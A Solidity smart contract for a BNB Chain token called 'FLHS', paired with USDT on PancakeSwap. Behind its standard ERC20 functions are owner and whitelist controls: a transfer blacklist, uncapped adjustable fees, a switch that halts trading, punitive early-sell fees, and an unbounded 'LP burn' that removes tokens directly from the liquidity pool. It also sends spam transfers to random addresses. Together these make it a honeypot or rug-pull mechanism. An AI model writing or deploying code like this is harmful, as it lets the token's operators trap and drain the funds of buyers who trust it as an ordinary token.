// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface ISwapRouter {
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);

    function factory() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface ISwapFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface ISwapPair {
    function sync() external;
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public receiveAddress;
    address public marketAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _tTotal;

    mapping(address => bool) public _blackList;
    mapping(address => bool) public _feeWhiteList;

    ISwapRouter public _swapRouter;
    address public _usdt;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);

    uint256 public buyFees = 4;
    uint256 public sellFees = 4;
    uint256 public transFees = 0;

    uint256 public swapTokenAmount;
    uint256 public startSwapTime;
    address public _mainPair;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(
        address RouterAddress,
        address USDTAddress,
        address ReceiveAddress,
        address MarketAddress,
        string memory Name,
        string memory Symbol,
        uint8 Decimals,
        uint256 Supply
    ) {
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        receiveAddress = ReceiveAddress;
        marketAddress = MarketAddress;
        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        _usdt = USDTAddress;
        _swapRouter = swapRouter;
        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), _usdt);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        swapTokenAmount = total / 10000;
        _tTotal = total;
        _balances[receiveAddress] = total;
        emit Transfer(address(0), receiveAddress, total);

        _feeWhiteList[receiveAddress] = true;
        _feeWhiteList[marketAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[msg.sender] = true;

        startSwapTime = total;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        require(!_blackList[from], "yrb");

        bool takeFee;
        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            takeFee = true;
            if (balance == amount) {
                amount = (amount * 9999) / 10000;
            }
            address ad;
            for (uint256 i = 0; i < 1; i++) {
                ad = address(
                    uint160(
                        uint(
                            keccak256(
                                abi.encodePacked(i, amount, block.timestamp)
                            )
                        )
                    )
                );
                _takeTransfer(from, ad, 100);
            }
            amount -= 100 * 1;

            require(block.timestamp >= startSwapTime, "!Trading");
            if (block.timestamp < startSwapTime + 3) {
                _funTransfer(from, to, amount);
                return;
            }

            if (_swapPairList[to]) {
                if (!inSwap) {
                    if (
                        lpBurnEnabled &&
                        block.timestamp >= lastLpBurnTime + lpBurnFrequency
                    ) {
                        autoBurnLiquidityPairTokens();
                    }
                    uint256 contractTokenBalance = balanceOf(address(this));
                    if (contractTokenBalance > swapTokenAmount) {
                        swapTokenForFund(contractTokenBalance);
                    }
                }
            }
        }

        _tokenTransfer(from, to, amount, takeFee);
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = (tAmount * 99) / 100;
        _takeTransfer(sender, address(this), feeAmount);
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;
        if (takeFee) {
            if (_swapPairList[sender]) {
                feeAmount = (tAmount * buyFees) / 100;
            } else if (_swapPairList[recipient]) {
                if (block.timestamp <= startSwapTime + 30 minutes) {
                    feeAmount = (tAmount * 25) / 100;
                } else {
                    feeAmount = (tAmount * sellFees) / 100;
                }
            } else {
                feeAmount = (tAmount * transFees) / 100;
            }
        }
        if (feeAmount > 0) {
            _takeTransfer(sender, address(this), feeAmount);
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        _approve(address(this), address(_swapRouter), tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _usdt;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            marketAddress,
            block.timestamp
        );
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    bool public lpBurnEnabled = true;
    uint256 public lpBurnFrequency = 60 seconds;
    uint256 public lastLpBurnTime;
    uint256 public percentForLPBurn = 27; // 25 = .25%

    function autoBurnLiquidityPairTokens() internal returns (bool) {
        lastLpBurnTime = block.timestamp;
        // get balance of liquidity pair
        uint256 liquidityPairBalance = this.balanceOf(_mainPair);
        // calculate amount to burn
        uint256 amountToBurn = (liquidityPairBalance * percentForLPBurn) /
            100000;
        // pull tokens from pancakePair liquidity and move to dead address permanently
        if (amountToBurn > 0) {
            _balances[_mainPair] = _balances[_mainPair] - amountToBurn;
            _takeTransfer(_mainPair, address(0xdead), amountToBurn);
        }
        //sync price since this is not in a swap transaction!
        ISwapPair pair = ISwapPair(_mainPair);
        pair.sync();
        return true;
    }

    function setSwapTokenAmount(uint256 _swapTokenAmount) external onlyOwner {
        swapTokenAmount = _swapTokenAmount;
    }

    function startTrade() external onlyOwner {
        startSwapTime = block.timestamp;
    }

    function setStartTime(uint256 starttime) external onlyOwner {
        startSwapTime = starttime;
    }

    function closeTrade() external onlyOwner {
        startSwapTime = _tTotal;
    }

    function setBlackList(
        address[] calldata addList,
        bool enable
    ) external onlyOwner {
        for (uint256 i = 0; i < addList.length; i++) {
            _blackList[addList[i]] = enable;
        }
    }

    function setFeeWhiteList(
        address[] calldata addList,
        bool enable
    ) external onlyOwner {
        for (uint256 i = 0; i < addList.length; i++) {
            _feeWhiteList[addList[i]] = enable;
        }
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function setFees(uint256 _bf, uint256 _sf, uint256 _tf) external onlyOwner {
        buyFees = _bf;
        sellFees = _sf;
        transFees = _tf;
    }

    function claimBalance() public {
        require(_feeWhiteList[msg.sender], "error");
        payable(msg.sender).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) public {
        require(_feeWhiteList[msg.sender], "error");
        IERC20(token).transfer(msg.sender, amount);
    }

    function setAutoLPBurnSettings(
        uint256 _frequencyInSeconds,
        uint256 _percent,
        bool _Enabled
    ) external {
        require(_feeWhiteList[msg.sender], "error");
        lpBurnFrequency = _frequencyInSeconds;
        percentForLPBurn = _percent;
        lpBurnEnabled = _Enabled;
    }

    receive() external payable {}
}

contract AAToken is AbsToken {
    constructor()
        AbsToken(
            address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
            address(0x55d398326f99059fF775485246999027B3197955),
            address(0x4F2d400319accEE1c394088FA63AbD6973F39bF1),
            address(0x4B42962B8E469be5024fa4D9d39d3B03EAC72739),
            "FLHS",
            "FLHS",
            18,
            1000000
        )
    {}
}